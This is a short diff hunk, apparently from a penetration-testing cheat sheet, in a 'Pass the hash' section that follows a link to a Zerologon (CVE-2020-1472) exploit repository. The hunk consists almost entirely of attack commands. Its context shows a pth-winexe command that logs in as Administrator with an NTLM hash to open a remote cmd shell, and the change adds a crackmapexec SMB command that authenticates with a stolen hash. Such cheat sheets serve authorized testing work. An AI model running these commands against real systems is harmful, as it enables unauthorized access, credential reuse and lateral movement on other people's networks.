@@ -250,4 +250,5 @@ https://github.com/dirkjanm/CVE-2020-1472
 #### Pass the hash
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3bf05c425e //$IP cmd
+crackmapexec smb $IP -u "User" -H $hash --local-auth
 ```
